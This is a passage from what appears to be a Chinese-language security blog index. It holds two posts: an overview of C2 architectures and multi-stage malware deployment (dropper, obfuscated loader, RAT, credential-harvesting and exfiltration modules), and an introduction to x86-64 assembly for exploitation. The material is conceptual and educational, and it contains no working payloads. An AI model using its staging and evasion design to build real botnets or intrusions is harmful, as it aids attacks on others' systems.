架構中加入「中心節點」\n\n\n中心節點僅負責登入、節點分發、任務通知\n\n\n\n\n實際資料交換仍走 P2P\n\n\n結合了中央管理的可靠性 + P2P 的高效率\n中心節點為 C2 Coordinator &#x2F; Tracker\n好搜尋、維運性強\n中心節點為明顯攻擊點\n\n\n\nLayered Peer Tree\n多層式的分級架構，類似企業組織樹狀圖：\n上層節點可控制下層多個節點（但非全功能超節點）\n下層節點可再控制下一層節點\n支援更大規模且階層式的任務傳遞與資料擴散\n支援多層部署、分層管理\n適合大型 Botnet &#x2F; C2，降低節點曝光風險\n若中層節點失效，會中斷整層資料傳遞\n\n\n\n\nMulti-Stage較為特殊的多段式的部署\n\nStage 0 - Initial Dropper\n初始投遞階段\n方法：\n利用最簡便的下載器 ( bash script )，建立 foothold ( 立足點 )\n\n\n\n\nStage 1 - Downloader &#x2F; loader\n下載器階段\n方法：\n像是使用HTTP/S + 強混淆從遠端的伺服器下載並載入更複雜的 payload，以規避靜態檢測使用\n\n\n\n\nStage 2 - Main payload &#x2F; RAT\n主要負載階段\n方法：\n使用 WebSocket OR HTTAP/S OR 自定義的加密協議，去部屬 C2 proxy 或是遠端存取木馬 ( Remote Access Trojan )\n\n\n\n\nStage 3 - Option Plugins &#x2F; Lateral Movement\n自訂義階段\n根據目標動態載入需要的模組，移動工具、憑證收集器、資料外洩模組等\n\n\n\n優缺點比較\n\n\n項目\nBeacon\nReverse Shell\nWebSocket&#x2F;HTTP2\nP2P\nMulti-Stage\n\n\n\n通訊方式\n單向、階段性\n雙向、即時\n雙向、即時\n多向、分散式\n混合、分階段\n\n\n封包協議\nHTTP&#x2F;DNS\nTCP&#x2F;HTTPS\nWebSocket&#x2F;HTTP2\n自定義&#x2F;混合\n多協議組合\n\n\n偽裝性\n高\n低\n很高\n中等\n極高\n\n\n傳輸模式\n輪詢\n持續連線\n持續連線\n分散式路由\n分階段傳輸\n\n\n檢測難度\n中等\n低\n高\n高\n極高\n\n\n技術複雜度\n低\n低\n中等\n高\n極高\n\n\n韌性\n低\n低\n中等\n高\n極高\n\n\n延遲性\n高\n低\n低\n中等\n視階段而定\n\n\n小結論C2 ( Command and Control ) 技術作為現代網路攻擊的核心組成部分，其技術複雜性和檢測難度持續增加。本報告通過系統性分析 C2 的技術定義、架構模型、通訊行為，快速的說明 C2 技術的框架，也會有後續說明技術層面的篇幅，可使讀者深入了解 C2 相關技術。\n從技術架構角度來看，C2 系統正在從傳統的 Client-Server 星型架構向更加複雜的 P2P 網狀架構和 Multi-Stage 分層架構演進。這種演進不僅提高了攻擊的隱蔽性和韌性，也為防禦者帶來了前所未有的挑戰。\n原本會在此加入真實案例分析，但因篇幅修訂問題，改成將於實戰篇進行分析實際案例。\n最後強調，C2 技術的研究和應用必須在合法合規的框架內進行。無論是紅隊演練還是藍隊防禦，都應該以提升整體網路安全水準為目標，為構建更加安全的數位世界做出貢獻。\n參考資料\nfortinet\nC2 複刻\nMedium APT28\nFireEye APT28\nCobalt Strikes\n\n","tags":["C2","Research"]},{"title":"Assembly-Language for pwn","url":"/2025/01/02/2025-1-2-Assembly-Language-Assembly-Language/","content":"\n\t目錄\n\n\n介紹組語\n組合語言的優勢包括\n在 PWN 領域，組合語言常用於\n\n\n介紹基本語法\n指令結構\n暫存器\n基本指令\n\n\n介紹 PWN\n介紹組語在 PWN 的作用\nPWN 的例子\n結論\n引用\n\n\n\n介紹組語組合語言（Assembly Language）是一種低階程式語言，是介於機器碼與高階語言(java、python、C&#x2F;C++…)之間的橋樑，與高階語言相比，組合語言能更精確地控制硬體行為，供對 CPU、記憶體及周邊設備的完全訪問。在學習 PWN（漏洞利用）時，熟悉組合語言有助於分析程式執行流程、理解漏洞成因以及構造漏洞利用方法。\n組合語言的優勢包括\n高效能與精確性：直接操作硬體，無多餘的抽象層。\n全面可見性：能查看程式的每一步執行細節。\n彈性控制：允許開發者手動優化程式，實現高效能目標。\n\n在 PWN 領域，組合語言常用於\n漏洞排查與調試：使用工具（如 GDB）觀察程式執行的組合語言指令。\nShellcode 編寫：設計小型惡意程式碼以實現特定目標。\nROP（Return-Oriented Programming）：拼湊現有指令來執行任意程式邏輯。\n\n介紹基本語法指令結構組合語言的每一行程式碼通常包含三部分：\n\n標籤（Label）：用於指示位置，類似於函數或變數名稱。\n操作碼（Opcode）：執行的指令，如 mov、add、jmp 等。\n操作數（Operands）：指令操作的目標，如暫存器、內存地址或立即數。\n\n以下為範例section .data\tmsg db &#x27;Hello, World!&#x27;, 0section .text\tglobal _start_start:\tmov rax, 1       ; 系統呼叫號：write\tmov rdi, 1       ; 第一參數：stdout\tmov rsi, msg     ; 第二參數：字串地址\tmov rdx, 13      ; 第三參數：字串長度\tsyscall          ; 呼叫內核\n暫存器常見的 x86-64 暫存器功能如下\n\nRAX：通常用於系統呼叫編號與函數返回值\n\nRDI, RSI, RDX：依序存放第一到第三個參數\n\nRSP, RBP：分別是堆疊指標與基底指標(這個在做bof時很重要)\n基本指令  ; 資料搬移指令mov rax, rbx       ; rax = rbxmov rdx, 0x10      ; rdx = 0x10 (16)lea rax, [rbx+4]   ; rax = rbx+4 的地址; 算術操作指令add rax, rbx       ; rax += rbxsub rax, 5         ; rax -= 5imul rax, rbx      ; rax = rax * rbxmov rax, 10        ; rax = 10mov rbx, 3         ; rbx = 3idiv rbx           ; 商存於 rax, 餘數存於 rdx; 邏輯運算指令and rax, 0xFF      ; rax &amp;= 0xFFor rax, rbx        ; rax |= rbxxor rax, rax       ; rax = 0（快速清零）not rax            ; rax = ~rax; 比較與跳轉指令cmp rax, rbx       ; 比較 rax 與 rbxje label           ; 若相等，跳轉到 labeljne label          ; 若不相等，跳轉到 labeljg label           ; 若 rax &gt; rbx，跳轉jl label           ; 若 rax &lt; rbx，跳轉; 堆疊操作指令push rax           ; 將 rax 壓入堆疊pop rbx            ; 從堆疊彈出值至 rbxcall function      ; 呼叫 functionret                ; 返回到呼叫處; 流程控制指令jmp label          ; 無條件跳轉到 labelmov rcx, 5         ; 設置迴圈次數loop_start:; 迴圈內代碼loop loop_start    ; 若 rcx &gt; 0，減1並跳轉; 進階指令mov rax, 60        ; 系統呼叫號：exitxor rdi, rdi       ; 退出狀態 0syscall            ; 呼叫內核nop                ; 不執行任何操作\n\n介紹 PWNPWN（漏洞利用，Exploit）是網路安全領域的一個重要主題，主要指的是利用程式中的漏洞來執行不法操作。這些漏洞通常是由開發者在設計或編寫程式時留下的缺陷，例如緩衝區溢位（Buffer Overflow）或格式字串漏洞（Format String Vulnerability）等。在進行 PWN 攻擊時，攻擊者通常會利用這些漏洞來獲取執行程式的控制權，進而執行任意程式碼。PWN 是現今許多CTF競賽和安全測試中常見的領域。組合語言在這其中扮演了關鍵的角色，因為它能精確操作硬體，並能有效利用底層漏洞。\n介紹組語在 PWN 的作用在 PWN 攻擊中，組合語言扮演著非常重要的角色，因為它允許攻擊者直接操控程式的執行過程。理解組合語言可以幫助攻擊者更好地理解漏洞是如何產生的，並且如何精確地利用這些漏洞。\n\n漏洞分析：攻擊者在分析程式時，會通過組合語言來查看程式的指令，理解程式如何運行。這有助於發現程式中可能存在的漏洞，並且能夠確定哪些位置可以被覆蓋或操控。\n漏洞利用：在漏洞利用的過程中，組合語言幫助攻擊者製作 shellcode、設計 ROP chain，甚至操作記憶體，以繞過各種安全機制（如堆疊保護、ASLR 等）。\n系統呼叫：在進行攻擊時，攻擊者需要觸發系統呼叫（syscall），以便與操作系統交互或控制系統資源。組合語言提供了直接執行這些操作的能力。\n\nPWN 的例子在 PWN 中常見的攻擊方式\n\n緩衝區溢位（Buffer Overflow）\n  攻擊者通過在緩衝區內寫入超過預期範圍的資料來覆蓋其他重要資料或控制流指令，進而控制程式的執行流程。組合語言在這裡幫助攻擊者理解如何利用記憶體結構，並精確設置跳轉指令。\n\n格式字串漏洞（Format String Vulnerability）\n  攻擊者利用格式字串錯誤，改變程序的內存內容，並從中讀取或寫入數據。組合語言可用於深入理解程式如何處理格式字串，並如何構造惡意的輸入。\n\nReturn-Oriented Programming（ROP）\n  這是一種利用已經存在於程式中的指令來進行攻擊的方法，攻擊者不需要直接執行 shellcode，而是利用現有的指令序列來達到目的。這需要對組合語言的深入理解，並利用組合語言指令來精心設計控制流程。\n\nHeap Overflow\n  攻擊者利用堆積區域的漏洞來操控堆中的資料，通常與程式的記憶體管理有關。此類攻擊在組合語言層面需要對內存分配、指標操作有非常精確的控制。\n\n\n結論組合語言是 PWN 攻擊中不可或缺的一部分，它使攻擊者能夠精確操控程式的執行流程，並有效利用底層漏洞。無論是在分析漏洞、編寫 shellcode 還是設計 ROP 攻擊，組合語言都提供了攻擊者極大的靈活性和控制力。理解組合語言對於學習和掌握 PWN 技術至關重要，並且能夠幫助我們更好地理解漏洞的根源，並設計更有效的防禦機制。\n","tags":["Assembly-Language","pwn"]}]